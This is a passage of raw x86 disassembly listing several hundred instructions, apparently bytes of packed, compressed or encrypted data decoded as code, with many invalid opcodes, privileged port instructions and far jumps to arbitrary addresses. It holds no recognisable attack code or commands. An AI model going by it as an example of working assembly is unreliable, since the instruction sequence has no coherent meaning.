  41fdf9:	jae    0x41fdd1
  41fdfb:	sbb    eax,0x674d6ee
  41fe00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe01:	sub    al,0x8c
  41fe03:	adc    bh,BYTE PTR [esi]
  41fe05:	pop    ds
  41fe06:	push   ds
  41fe07:	push   es
  41fe08:	ficom  DWORD PTR [ebx]
  41fe0a:	inc    edi
  41fe0b:	sbb    cl,BYTE PTR [edx]
  41fe0d:	call   0xdb838fe0
  41fe12:	sbb    al,0x5b
  41fe14:	or     esi,DWORD PTR [ebx-0x5c]
  41fe17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe18:	out    0xe5,al
  41fe1a:	xor    edx,DWORD PTR [edi]
  41fe1c:	push   edx
  41fe1d:	loope  0x41fe54
  41fe1f:	shl    DWORD PTR [edx+edx*2],0xc5
  41fe23:	push   cs
  41fe24:	pop    ecx
  41fe25:	daa    
  41fe26:	xchg   esi,eax
  41fe27:	jnp    0x41fe98
  41fe29:	cmp    dh,BYTE PTR [ebp-0x22]
  41fe2c:	jg     0x41fe56
  41fe2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe2f:	ja     0x41fde3
  41fe31:	add    ecx,DWORD PTR [esi-0x47]
  41fe34:	jbe    0x41fea2
  41fe36:	scas   eax,DWORD PTR es:[edi]
  41fe37:	push   esp
  41fe38:	cdq    
  41fe39:	pop    ss
  41fe3a:	fwait
  41fe3b:	push   edi
  41fe3c:	imul   ebp,ebp,0x20
  41fe3f:	cdq    
  41fe40:	(bad)
  41fe45:	adc    DWORD PTR [ebp+0x16],ebp
  41fe48:	xor    cl,BYTE PTR [edi+0x446f7165]
  41fe4e:	sub    ch,bl
  41fe50:	jp     0x41fdf2
  41fe52:	js     0x41fdfe
  41fe54:	cwde   
  41fe55:	addr16 mov al,0x30
  41fe58:	jb     0x41fe14
  41fe5a:	xor    al,0xc4
  41fe5c:	(bad)  
  41fe5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe5e:	mov    ebp,0xf12b5c93
  41fe63:	pop    ds
  41fe64:	mov    bl,0xea
  41fe66:	pushw  0x4fcc
  41fe6a:	lods   al,BYTE PTR ds:[esi]
  41fe6b:	mov    ds:0xde7a4475,eax
  41fe70:	sub    ebx,DWORD PTR [ecx+0x8]
  41fe73:	pop    ds
  41fe74:	ffree  st(6)
  41fe76:	add    esi,DWORD PTR [eax-0x6c3fb493]
  41fe7c:	adc    BYTE PTR [ecx-0x31],ch
  41fe7f:	pop    ds
  41fe80:	push   0xffffffe7
  41fe82:	nop
  41fe83:	stos   DWORD PTR es:[edi],eax
  41fe84:	xchg   edi,eax
  41fe85:	mov    esp,0xd3168b49
  41fe8a:	sbb    eax,0xdec04a6f
  41fe8f:	sub    BYTE PTR [esi+0x63b068ff],al
  41fe95:	adc    DWORD PTR [ebx],edi
  41fe97:	xor    ecx,DWORD PTR [ecx-0x22]
  41fe9a:	or     DWORD PTR [ebx+ebx*4],edx
  41fe9d:	fist   WORD PTR [esi]
  41fe9f:	or     eax,0x6cce4f87
  41fea4:	(bad)  
  41fea5:	pop    eax
  41fea6:	ror    DWORD PTR [esi+0x18],1
  41fea9:	cmp    al,0x14
  41feab:	out    dx,eax
  41feac:	loope  0x41fef4
  41feae:	push   ebp
  41feaf:	push   0x56b06dc8
  41feb4:	cmp    bl,BYTE PTR [esi-0x7adb885b]
  41feba:	jb     0x41febe
  41febc:	sbb    ebx,DWORD PTR [esi-0x7ae9cc7]
  41fec2:	cli    
  41fec3:	sub    eax,0xf850dd70
  41fec8:	es push edi
  41feca:	adc    al,ch
  41fecc:	ret    0x3c31
  41fecf:	cld    
  41fed0:	std    
  41fed1:	sub    eax,0x77d0c7dc
  41fed6:	pushf  
  41fed7:	jmp    0x41fea8
  41fed9:	jno    0x41ff08
  41fedb:	sub    bl,bh
  41fedd:	je     0x41feba
  41fedf:	xchg   edi,eax
  41fee0:	and    al,0x33
  41fee2:	mov    ebx,0x3727b406
  41fee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fee8:	or     eax,0x536e56a6
  41feed:	sbb    DWORD PTR [edi+0xa],esi
  41fef0:	lds    edx,FWORD PTR [edi+0x4f78c7fe]
  41fef6:	add    ah,BYTE PTR [edi]
  41fef8:	loope  0x41fe99
  41fefa:	pop    ebx
  41fefb:	cs jmp 0x9029:0xa761fb7c
  41ff03:	inc    ebp
  41ff04:	sbb    dh,cl
  41ff06:	lock inc ebp
  41ff08:	addr16 pop edi
  41ff0a:	xor    esp,edx
  41ff0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff0d:	lods   eax,DWORD PTR ds:[esi]
  41ff0e:	sub    eax,0xd6a663fa
  41ff13:	in     eax,dx
  41ff14:	nop
  41ff15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff16:	aas    
  41ff17:	pop    esi
  41ff18:	add    BYTE PTR [edx],bh
  41ff1a:	add    DWORD PTR [ecx],ebx
  41ff1c:	jge    0x41ff0f
  41ff1e:	pop    es
  41ff1f:	das    
  41ff20:	adc    ecx,DWORD PTR [eax+0x2bbd2c7]
  41ff26:	test   DWORD PTR [edx],esp
  41ff28:	retf   
  41ff29:	mov    eax,ds:0xe6172faa
  41ff2e:	inc    ebp
  41ff2f:	imul   esp,DWORD PTR [edx+0x570595a9],0x9c73d3c2
  41ff39:	fidiv  WORD PTR [edi-0x2beb7ea9]
  41ff3f:	jmp    0x15efb54f
  41ff44:	lods   eax,DWORD PTR ds:[esi]
  41ff45:	sub    eax,0xeb8727ff
  41ff4a:	hlt    
  41ff4b:	pop    ebx
  41ff4c:	pop    ebx
  41ff4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff4e:	dec    ebp
  41ff4f:	nop
  41ff50:	add    ecx,DWORD PTR [ebp+0x796ee26a]
  41ff56:	in     eax,0x30
  41ff58:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41ff5a:	gs xchg ebx,eax
  41ff5c:	(bad)  
  41ff5e:	inc    edx
  41ff5f:	gs hlt 
  41ff61:	in     al,dx
  41ff62:	les    edx,FWORD PTR [ebp-0x7329707]
  41ff68:	ss mov edx,0x28ce3da8
  41ff6e:	xor    ch,al
  41ff70:	fmul   DWORD PTR [ecx]
  41ff72:	dec    ebx
  41ff73:	rol    BYTE PTR [eax],cl
  41ff75:	xchg   edi,eax
  41ff76:	or     eax,0xafb0898e
  41ff7b:	int    0x17
  41ff7d:	xchg   ebp,eax
  41ff7e:	and    DWORD PTR [ebp-0x2],edx
  41ff81:	shr    DWORD PTR [edi-0x7e],0x2f
  41ff85:	xlat   BYTE PTR ds:[ebx]
  41ff86:	fld    st(7)
  41ff88:	dec    ecx
  41ff89:	mov    ch,0xe4
  41ff8b:	pop    esi
  41ff8c:	ror    BYTE PTR [ebp+0x65],0xc2
  41ff90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff91:	jecxz  0x41ff75
  41ff93:	mov    edi,0xe2afa8b2
  41ff98:	rdmsr  
  41ff9a:	jbe    0x41ff56
  41ff9c:	or     eax,0x463dc335
  41ffa1:	jae    0x41fff1
  41ffa3:	mov    esp,0x4b696567
  41ffa8:	je     0x41ff45
  41ffaa:	mov    ch,BYTE PTR [edx-0x37]
  41ffad:	pop    ebx
  41ffae:	xchg   esi,eax
  41ffaf:	ja     0x41ffb6
  41ffb1:	push   ds
  41ffb2:	jne    0x41ffd7
  41ffb4:	test   eax,0x4960678b
  41ffb9:	dec    esi
  41ffba:	mov    edx,0xf0bdb04f
  41ffbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffc0:	xchg   BYTE PTR [edx-0x64cdfe95],dl
  41ffc6:	movlps xmm5,QWORD PTR [ebp+0x53d89e98]
  41ffcd:	mov    ecx,0xce81a81e
  41ffd2:	les    ebp,FWORD PTR [esi+0x147526f1]
  41ffd8:	push   esp
  41ffd9:	or     DWORD PTR [esi-0x63],esp
  41ffdc:	cmp    dl,BYTE PTR [edi+0x39]
  41ffdf:	leavew 
  41ffe1:	lahf   
  41ffe2:	push   ebp
  41ffe3:	sub    al,0x30
  41ffe5:	or     eax,0x87ba11dc
  41ffea:	mov    bl,0x77
  41ffec:	add    al,0x75
  41ffee:	popa   
  41ffef:	jecxz  0x42001f
  41fff1:	mov    dl,0x5c
  41fff3:	cmp    DWORD PTR [ebx],esi
  41fff5:	sbb    dl,BYTE PTR [eax+0x5945d1ef]
  41fffb:	arpl   sp,bp
  41fffd:	mov    cs,esi
  41ffff:	pop    ecx
  420000:	lahf   
  420001:	(bad)  
  420002:	xchg   ebp,eax
  420003:	out    dx,eax
  420004:	pop    ebp
  420005:	clc    
  420006:	call   0xf932:0x47734d2d
  42000d:	adc    bl,dl
  42000f:	iret   
  420010:	xchg   edi,eax
  420011:	mov    ecx,0xf7cbd0d4
  420016:	(bad)  
  420017:	mov    ebp,0x1fccb647
  42001c:	imul   edi,ecx,0x605480a0
  420022:	inc    ebx
  420023:	dec    eax
  420024:	es inc ecx
  420026:	(bad)
  420029:	push   edi
  42002a:	mov    eax,ds:0xbe58bbc2
  42002f:	pop    eax
  420030:	outs   dx,DWORD PTR ds:[esi]
  420031:	xor    bh,ah
  420033:	int    0xb5
  420035:	mov    ds:0x6ed38eb9,eax
  42003a:	cmp    al,0x18
  42003c:	pushf  
  42003d:	scas   al,BYTE PTR es:[edi]
  42003e:	jmp    0xaffea48
  420043:	xor    DWORD PTR [ecx],ecx
  420045:	xchg   esp,eax
  420046:	mov    al,ds:0x732cd0c5
  42004b:	(bad)  
  42004c:	aad    0x4e
  42004e:	scas   eax,DWORD PTR es:[edi]
  42004f:	or     ecx,DWORD PTR [eax]
  420051:	dec    ebx
  420052:	les    edi,FWORD PTR [ebp+0x4eebcd16]
  420058:	jns    0x41fffa
  42005a:	pop    eax
  42005b:	xchg   esi,eax
  42005c:	nop
  42005d:	enter  0x2280,0x59
  420061:	mov    al,0x6
  420063:	fcomp  QWORD PTR [esi]
  420065:	ds xchg ebx,eax
  420067:	retf   0x66ce
  42006a:	pop    edx
  42006b:	cmp    eax,edi
  42006d:	sub    esi,DWORD PTR [edx-0x41]
  420070:	xor    BYTE PTR [ebx+0x1f],al
  420073:	push   0x75325055
  420078:	push   DWORD PTR ds:0xa447f701
  42007e:	and    ebp,DWORD PTR [ebp+0xf]
  420081:	cmp    ah,BYTE PTR [ecx+eax*1-0x68]
  420085:	inc    ebp
  420086:	lahf   
  420087:	nop
  420088:	jg     0x42009e
  42008a:	cmp    eax,0xc3cbef1e
  42008f:	iret   
  420090:	push   edx
  420091:	lods   al,BYTE PTR ds:[esi]
  420092:	push   edi
  420093:	pop    edx
  420094:	out    dx,al
  420095:	in     al,0xe2
  420097:	sbb    BYTE PTR [ebp*2-0x26f61f20],0x2b
  42009f:	push   ecx
  4200a0:	out    0xf6,al
  4200a2:	repz jmp 0x6d68:0x987890ee
  4200aa:	daa    
  4200ab:	cs add eax,0xa94bde4a
  4200b1:	dec    esp
  4200b2:	arpl   WORD PTR [esi-0x4e],dx
  4200b5:	or     al,0x7d
  4200b7:	lods   al,BYTE PTR ds:[esi]
  4200b8:	mov    edx,0x93cddcb7
  4200bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200be:	(bad)  
  4200bf:	mov    ecx,0x13e18397
  4200c4:	add    ebx,ebx
  4200c6:	dec    ecx
  4200c7:	in     eax,0x6b
  4200c9:	cli    
  4200ca:	push   ss
  4200cb:	mov    esp,edx
  4200cd:	lds    edi,FWORD PTR [ecx-0x5b]
  4200d0:	inc    ebp
  4200d1:	adc    dl,BYTE PTR [edx+0x5]
  4200d4:	and    eax,0x525120f
  4200d9:	jl     0x4200ad
  4200db:	out    dx,al
  4200dc:	push   0x4e89b6c7
  4200e1:	ret    0x1982
  4200e4:	cmp    edi,edx
  4200e6:	into   
  4200e7:	fmul   QWORD PTR [edi-0x14]
  4200ea:	jecxz  0x42007c
  4200ec:	inc    ecx
  4200ed:	imul   edx,DWORD PTR [edi],0x4c4c83a1
  4200f3:	xchg   edi,eax
  4200f4:	hlt    
  4200f5:	scas   al,BYTE PTR es:[edi]
  4200f6:	(bad)  [ebx+0x2520c7]
  4200fc:	mov    ecx,0xf24b7d1
  420102:	test   DWORD PTR [ecx-0x56d704a9],ebx
  420108:	and    al,0x29
  42010a:	sar    BYTE PTR [edx-0x67023032],0x9c
  420111:	xchg   ecx,eax
  420112:	push   0xffffff99
  420114:	test   al,0x33
  420116:	mov    ds,edi
  420118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420119:	add    al,BYTE PTR [esp+eiz*4+0x5c70f9eb]
  420120:	pop    ds
  420121:	mov    cl,0xad
  420123:	jno    0x420128
  420125:	lahf   
  420126:	hlt    
  420127:	fnstcw WORD PTR [eax+0x4fd2bb83]
  42012d:	mov    ch,BYTE PTR [eax-0x77]
  420130:	and    bh,BYTE PTR [edi-0x7e]
  420133:	les    eax,FWORD PTR [esi+0x74751eb5]
  420139:	and    ebx,edi
  42013b:	xchg   ebx,eax
  42013c:	mov    ch,0x18
  42013e:	out    0x2f,eax
  420140:	and    BYTE PTR [edx],ch
  420142:	std    
  420143:	adc    esp,DWORD PTR [ecx-0x22]
  420146:	adc    BYTE PTR [eax+0x74c266c2],bl
  42014c:	repnz and cl,BYTE PTR [eax+0x74]
  420150:	bswap  ebx
  420152:	pusha  
  420153:	addr16 sti 
  420155:	dec    ecx
  420156:	sbb    edx,DWORD PTR [ebx+0x7b8afffc]
  42015c:	adc    dl,BYTE PTR [ecx-0x600719e9]
  420162:	sub    ah,ch
  420164:	cmp    al,0xb5
  420166:	mov    ebx,0x454613e9
  42016b:	js     0x42019d
  42016d:	push   es
  42016e:	mov    esp,0x7021ba68
  420173:	imul   esi,DWORD PTR [esi+0x74],0x50ff7688
  42017a:	and    ecx,DWORD PTR [ecx]
  42017c:	scas   al,BYTE PTR es:[edi]
  42017d:	cli    
  42017e:	xchg   edx,eax
  42017f:	loop   0x4201d3
  420181:	sbb    esi,ecx
  420183:	fistp  QWORD PTR [eax]
  420185:	(bad)  
  420186:	stc    
  420187:	scas   eax,DWORD PTR es:[edi]
  420188:	stos   DWORD PTR es:[edi],eax
  420189:	ret    
  42018a:	pop    ss
  42018b:	push   es
  42018c:	inc    esi
  42018d:	pusha  
  42018e:	ins    DWORD PTR es:[edi],dx
  42018f:	xchg   ebx,eax
  420190:	data16 ins BYTE PTR es:[edi],dx
  420192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420193:	fidiv  DWORD PTR [ebp+0x20148d11]
  420199:	xchg   ecx,eax
  42019a:	int    0x35
  42019c:	push   ebp
  42019d:	out    0x8b,al
  42019f:	mov    al,0xf2
  4201a1:	lods   eax,DWORD PTR ds:[esi]
  4201a2:	iret   
  4201a3:	(bad)  
  4201a4:	pop    ebx
  4201a5:	xchg   edx,eax
  4201a6:	inc    esp
  4201a7:	fucom  st(0)
  4201a9:	arpl   WORD PTR [edi-0x368101bd],cx
  4201af:	rcr    BYTE PTR [esi],cl
  4201b1:	dec    ecx
  4201b2:	mov    BYTE PTR [eax],cl
  4201b4:	push   0xfa4c6768
  4201b9:	jmp    0xf1fa:0xb24b89c7
  4201c0:	add    ebx,edi
  4201c2:	std    
  4201c3:	sub    ebx,DWORD PTR [ecx+ebx*4]
  4201c6:	adc    al,0xaf
  4201c8:	rcr    ah,0x15
  4201cb:	inc    ebx
  4201cc:	sbb    BYTE PTR [eax+0xa5777a2],0xd7
  4201d3:	fsubr  QWORD PTR [ecx]
  4201d5:	lds    esp,FWORD PTR [ebp-0x73ac22a3]
  4201db:	xchg   edi,eax
  4201dc:	jmp    0x737e:0xa96cac7b
  4201e3:	pop    ebp
  4201e4:	and    esi,DWORD PTR [esi+0x231d6f48]
  4201ea:	dec    edi
  4201eb:	add    al,dh
  4201ed:	cld    
  4201ee:	js     0x4201ac
  4201f0:	daa    
  4201f1:	int3   
  4201f2:	mov    dl,0x15
  4201f4:	mov    ebx,0x2d43b2dc
  4201f9:	and    ch,BYTE PTR [ebp+0x50]
  4201fc:	xor    BYTE PTR [edi],ch
  4201fe:	shl    DWORD PTR [esi],cl
  420200:	xchg   DWORD PTR [edx+0x7b634021],edx
  420206:	and    ch,BYTE PTR [eax+0x3ac5baa4]
  42020c:	or     BYTE PTR fs:[esi-0x6d],0x7f
  420211:	xchg   esi,eax
  420212:	test   al,0xe5
  420214:	sbb    esi,DWORD PTR [ebp+0x544612d2]
  42021a:	aas    
  42021b:	xor    esi,esi
  42021d:	es or  edx,esp
  420220:	push   eax
  420221:	fist   DWORD PTR [ebx-0x6d0f050]
  420227:	pop    esp
  420228:	leave  
  420229:	jnp    0x420292
  42022b:	jnp    0x4201fe
  42022d:	fcom   QWORD PTR [edx-0x63d48a34]
  420233:	xchg   edx,eax
  420234:	(bad)  
  420235:	std    
  420236:	xor    esi,ebx
  420238:	sub    eax,ebp
  42023a:	or     al,0x57
  42023c:	aad    0xf9
  42023e:	jmp    DWORD PTR [ebp+0x7c1eb5a3]
  420244:	cmc    
  420245:	outs   dx,BYTE PTR ds:[esi]
  420246:	cmp    al,ch
  420248:	mov    esp,0xcb147e58
  42024d:	inc    esi
  42024e:	sti    
  42024f:	inc    ebp
  420250:	dec    eax
  420251:	call   0xa390:0x506ea6cf
  420258:	stos   DWORD PTR es:[edi],eax
  420259:	jmp    0xe376:0xa6af0cea
  420260:	daa    
  420261:	repz push edx
  420263:	sti    
  420264:	xchg   edi,eax
  420265:	mov    fs,edx
  420267:	scas   al,BYTE PTR es:[edi]
  420268:	push   ss
  420269:	add    esi,DWORD PTR [edi-0x23]
  42026c:	aas    
  42026d:	jecxz  0x42022a
  42026f:	mov    dh,0x94
  420271:	mov    dh,0x41
  420273:	inc    esp
  420274:	pop    eax
  420275:	mov    al,al
  420277:	out    dx,eax
  420278:	int    0xb2
  42027a:	mov    eax,0xc2e2abb3
  42027f:	or     cl,BYTE PTR [esi]
  420281:	sub    ebp,DWORD PTR [edx-0x2d66173]
  420287:	cmp    cl,0x76
  42028a:	mov    WORD PTR [eax+0x21db9de7],cs
  420290:	sbb    esp,edi
  420292:	and    DWORD PTR [ecx+0x7fbdf786],0xffffffa1
  420299:	test   al,0x94
  42029b:	mov    ecx,0x81c29374
  4202a0:	int3   
  4202a1:	rcr    DWORD PTR [edi+0x43893e69],0xb2
  4202a8:	cmp    eax,0x4ea7ea08
  4202ad:	(bad)  
  4202ae:	sahf   
  4202af:	sahf   
  4202b0:	lds    ebx,FWORD PTR [ebx+0x52c730c4]
  4202b6:	cmp    dl,BYTE PTR [edi+0x3b]
  4202b9:	test   BYTE PTR [ebx-0x39],al
  4202bc:	lods   al,BYTE PTR ds:[esi]
  4202bd:	adc    edi,DWORD PTR [esi-0x13]
  4202c0:	aas    
  4202c1:	sti    
  4202c2:	inc    ebp
  4202c3:	jp     0x42027e
  4202c5:	retf   0xfd52
  4202c8:	cmp    eax,0x9c85b229
  4202cd:	xor    eax,0xe7e8e155
  4202d2:	mov    eax,ds:0x60614962
  4202d7:	xchg   edi,eax
  4202d8:	mov    dh,0xa
  4202da:	push   ecx
  4202db:	cld    
  4202dc:	in     eax,0x6b
  4202de:	(bad)  
  4202df:	fnstcw WORD PTR [edx-0x1b]
  4202e2:	mov    esp,0xccc4da11
  4202e7:	shl    DWORD PTR [edi-0x2e],0x72
  4202eb:	lods   eax,DWORD PTR ds:[esi]
  4202ec:	and    eax,0x6b54b0bc
  4202f1:	gs jl  0x42034b
  4202f4:	add    DWORD PTR [ebx],ebp
  4202f6:	mov    dh,0xaa
  4202f8:	retf   0xdb02
  4202fb:	push   ecx
  4202fc:	test   DWORD PTR [ebp+0x1bd9d96],eax
  420302:	cmp    DWORD PTR [ebx+0x28248b4b],ebx
  420308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420309:	jbe    0x42029c
  42030b:	jae    0x420316
  42030d:	add    BYTE PTR [ecx+eiz*4],al
  420310:	ins    BYTE PTR es:[edi],dx
  420311:	es pushf 
  420313:	repnz xchg esp,eax
  420315:	adc    eax,0x9a07d24b
  42031a:	cli    
  42031b:	xchg   ecx,eax
  42031c:	or     BYTE PTR [ecx+0x76756b8d],ch
  420322:	or     al,0xb6
  420324:	retf   
  420325:	sbb    BYTE PTR [ecx+ebp*8-0x4215d131],al
  42032c:	aam    0xf5
  42032e:	mov    dl,0xa7
  420330:	shl    DWORD PTR [esi+0x21138242],1
  420336:	sbb    al,0x86
  420338:	faddp  st(6),st
  42033a:	popa   
  42033b:	gs imul edx,esi,0x2d
  42033f:	enter  0xe259,0x60
  420343:	pop    es
  420344:	imul   ebp,DWORD PTR [edi+0x63],0x76
  420348:	scas   al,BYTE PTR es:[edi]
  420349:	stos   DWORD PTR es:[edi],eax
  42034a:	jge    0x4203c4
  42034c:	hlt    
  42034d:	aas    
  42034e:	dec    eax
  42034f:	mov    bh,0xbd
  420351:	cdq    
  420352:	cmp    BYTE PTR [ebp-0x3d],dh
  420355:	jnp    0x4203ca
  420357:	cli    
  420358:	mov    ebp,0x24e5f968
  42035d:	mov    bh,0x49
  42035f:	adc    ebp,DWORD PTR [ebp+0x742a4f16]
  420365:	imul   ebx,DWORD PTR [edi+esi*2+0x1a],0x7b
  42036a:	outs   dx,DWORD PTR ds:[esi]
  42036b:	ins    BYTE PTR es:[edi],dx
  42036c:	shl    BYTE PTR [edx-0x37d21bd8],0xfa
  420373:	push   ebx
  420374:	push   edi
  420375:	cld    
  420376:	sub    al,0xb3
  420378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420379:	cmp    al,0xb2
  42037b:	jge    0x4203db
  42037d:	sbb    edx,esi
  42037f:	aas    
  420380:	out    dx,eax
  420381:	out    dx,eax
  420382:	retf   
  420383:	jnp    0x420333
  420385:	lods   eax,DWORD PTR ds:[esi]
  420386:	nop
  420387:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420388:	pop    ss
  420389:	popa   
  42038a:	pop    eax
  42038b:	inc    ecx
  42038c:	scas   eax,DWORD PTR es:[edi]
  42038d:	mov    BYTE PTR [edi+ebp*8],ch
  420390:	jns    0x420351
  420392:	xor    BYTE PTR [edi],bl
  420394:	lahf   
  420395:	or     dh,BYTE PTR [eax-0x33]
  420398:	aaa    
  420399:	push   edx
  42039a:	push   es
  42039b:	sub    ecx,0x31
  42039e:	add    ch,BYTE PTR [edx-0x6b3dcf75]
  4203a4:	sub    edx,ebp
  4203a6:	inc    edx
  4203a7:	mov    esp,DWORD PTR [ebx-0x3895356a]
  4203ad:	arpl   dx,si
  4203af:	xor    eax,0xed0a18b8
  4203b4:	aam    0xd7
  4203b6:	jl     0x42037f
  4203b8:	mov    dl,0x5a
  4203ba:	cmp    ebp,ecx
  4203bc:	iret   
  4203bd:	cs neg ch
  4203c0:	sahf   
  4203c1:	(bad)  [eax-0x54]
  4203c4:	test   esi,esi
  4203c6:	test   esi,0xda1d29a6
  4203cc:	test   eax,0xb9d0e4e9
  4203d1:	add    al,0x7d
  4203d3:	inc    edx
  4203d4:	ins    DWORD PTR es:[edi],dx
  4203d5:	mov    ecx,0xb32610f6
  4203da:	enter  0xdd73,0x16
  4203de:	sbb    BYTE PTR [edx+0x55],ah
  4203e1:	adc    ah,BYTE PTR ss:[eax-0x79d0894f]
  4203e8:	(bad)  
  4203e9:	sti    
  4203ea:	rol    ch,0x21
  4203ed:	mov    ds:0x4406e95e,eax
  4203f2:	push   ebp
  4203f3:	fldenv [ebp+0x7e]
  4203f6:	retf   
  4203f7:	jg     0x420395
  4203f9:	fdivr  DWORD PTR [esi+edi*1-0x16d17269]
  420400:	icebp  
  420401:	dec    eax
  420402:	outs   dx,DWORD PTR ds:[esi]
  420403:	pop    ss
  420404:	jmp    0x4203de
  420406:	sbb    ch,dh
  420408:	imul   esp,DWORD PTR [ebx],0x3f
  42040b:	loop   0x4203f2
  42040d:	hlt    
  42040e:	xor    eax,0x17795d7b
  420413:	lahf   
  420414:	mov    edi,0x81f65fb4
  420419:	je     0x4203ba
  42041b:	fist   DWORD PTR [esp+esi*8-0x60]
  42041f:	enter  0x995f,0x53
  420423:	xchg   ebp,eax
  420424:	jp     0x42040c
  420426:	push   edx
  420427:	inc    ebx
  420428:	js     0x4203f6
  42042a:	inc    edi
  42042b:	(bad)  
  42042c:	aas    
  42042d:	add    al,0x67
  42042f:	adc    cl,BYTE PTR [ebx-0x13]
  420432:	adc    ebx,esp
  420434:	inc    eax
  420435:	push   ds
  420436:	hlt    
  420437:	fucomi st,st(6)
  420439:	xchg   esp,eax
  42043a:	lock jle 0x420424
  42043d:	jecxz  0x42047f
  42043f:	cmp    edi,esp
  420441:	sub    eax,0xcb83896b
  420446:	je     0x420432
  420448:	fcomp  QWORD PTR [edi+0x354964c5]
  42044e:	pop    ecx
  42044f:	mov    esi,0xa4cd4fa4
  420454:	cmp    edi,ebx
  420456:	js     0x4203fe
  420458:	push   ecx
  420459:	dec    eax
  42045a:	sbb    eax,0xdcf06ac6
  42045f:	xor    edx,esp
  420461:	cmp    al,0xb
  420463:	inc    ecx
  420464:	je     0x4203ec
  420466:	fcmovu st,st(1)
  420468:	loope  0x42045c
  42046a:	mov    ds:0xe73e640e,eax
  42046f:	push   ss
  420470:	sahf   
  420471:	jge    0x42048d
  420473:	fsub   QWORD PTR [ebp+0x3f]
  420476:	pop    ecx
  420477:	jo     0x420416
  420479:	mov    al,0xb
  42047b:	or     dl,al
  42047d:	jae    0x420439
  42047f:	inc    eax
  420480:	xor    bl,BYTE PTR [edi+ecx*4-0x10262cfd]
  420487:	out    0xed,al
  420489:	mov    edi,0xe6c9c0a0
  42048e:	and    eax,DWORD PTR [edi-0x77b8db49]
  420494:	mov    dl,0xf2
  420496:	ret    0xd13
  420499:	sub    DWORD PTR ds:0x1ad75f75,eax
  42049f:	xor    BYTE PTR [edx+0x48d1ab1c],cl
  4204a5:	and    BYTE PTR [esi-0x52],cl
  4204a8:	mov    WORD PTR [esi-0x6a3b8d13],fs
  4204ae:	enter  0x874c,0x43
  4204b2:	sbb    BYTE PTR [ebx+0x13e766e4],bl
  4204b8:	fmul   QWORD PTR [edx-0x5b9de632]
  4204be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204bf:	mov    dl,ah
  4204c1:	ret    
  4204c2:	cwde   
  4204c3:	xor    ecx,ebp
  4204c5:	jp     0x42053c
  4204c7:	daa    
  4204c8:	aaa    
  4204c9:	lea    esp,[edi]
  4204cb:	enter  0x517a,0xe3
  4204cf:	inc    edx
  4204d0:	push   0x34
  4204d2:	mov    esp,0xfb5764d7
  4204d7:	scas   eax,DWORD PTR es:[edi]
  4204d8:	retf   0xf6b2
  4204db:	pusha  
  4204dc:	mov    dl,0x49
  4204de:	bound  esi,QWORD PTR [ecx+ecx*2+0x5de8f7a6]
  4204e5:	in     al,0x78
  4204e7:	push   ss
  4204e8:	fld    TBYTE PTR [edi-0x15cfc946]
  4204ee:	xor    al,ch
  4204f0:	jmp    0x4efbb4ae
  4204f5:	shl    BYTE PTR [edx-0x3a13bbb1],cl
  4204fb:	cld    
  4204fc:	bound  ebx,QWORD PTR [eax-0x43]
  4204ff:	(bad)  
  420500:	mov    ebx,0x59c54bbf
  420505:	xor    eax,ebx
  420507:	jmp    0x420499
  420509:	daa    
  42050a:	mov    bh,0x4f
  42050c:	cli    
  42050d:	sbb    eax,0x1eb0d0d6
  420512:	mov    eax,0xdeed200c
  420517:	xchg   edx,eax
  420518:	push   es
  420519:	popa   
  42051a:	out    dx,al
  42051b:	cmovs  esi,DWORD PTR [ecx]
  42051e:	in     al,0x95
  420520:	sub    eax,edx
  420522:	in     al,dx
  420523:	xlat   BYTE PTR ds:[ebx]
  420524:	(bad)  
  420525:	rcr    BYTE PTR [ebx],cl
  420527:	inc    edx
  420528:	enter  0xc9c5,0x8f
  42052c:	cli    
  42052d:	lahf   
  42052e:	ret    0xbfe0
  420531:	lea    esi,[esi]
  420533:	jno    0x42056e
  420535:	cmc    
  420536:	in     eax,dx
  420537:	(bad)  
  420538:	test   eax,0x54a46cd3
  42053d:	jecxz  0x4205a4
  42053f:	mov    bl,0x88
  420541:	or     eax,0xefb8caee
  420546:	ss push edx
  420548:	push   edx
  420549:	and    al,0x2d
  42054b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42054c:	jl     0x420571
  42054e:	pop    eax
  42054f:	pop    esi
  420550:	lea    eax,[ecx-0x6ccf5f9c]
  420556:	fs xchg ebx,eax
  420558:	jne    0x4204fe
  42055a:	fbstp  TBYTE PTR [eax-0x27457aeb]
  420560:	shr    DWORD PTR [ecx+0x51],cl
  420563:	xchg   edi,eax
  420564:	xor    esp,esi
  420566:	inc    edx
  420567:	push   cs
  420568:	ja     0x4204fa
  42056a:	mov    bl,0xeb
  42056c:	pop    ecx
  42056d:	outs   dx,BYTE PTR ds:[esi]
  42056e:	std    
  42056f:	aam    0x62
  420571:	pop    ebx
  420572:	jmp    0x17c6ce84
  420577:	data16 in al,0xa0
  42057a:	mov    ds:0xfb0b7d01,eax
  42057f:	push   ss
  420580:	pop    esi
  420581:	fild   DWORD PTR [ecx-0x242818c7]
  420587:	inc    ecx
  420588:	push   edi
  420589:	dec    BYTE PTR [eax+0x35849ff1]
  42058f:	dec    edi
  420590:	add    eax,0x60882af6
  420595:	push   ebp
  420596:	pop    esp
  420597:	(bad)
  42059a:	rcr    edi,1
  42059c:	imul   ebx,DWORD PTR [ecx-0x32991011],0x4ca6166a
  4205a6:	cmp    cl,ah
